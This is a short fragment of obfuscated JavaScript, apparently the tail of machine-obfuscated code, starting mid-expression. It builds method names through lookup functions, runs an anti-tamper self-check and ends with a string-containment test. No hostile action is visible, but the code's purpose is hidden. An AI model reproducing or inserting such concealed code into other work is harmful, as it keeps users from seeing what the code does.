u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};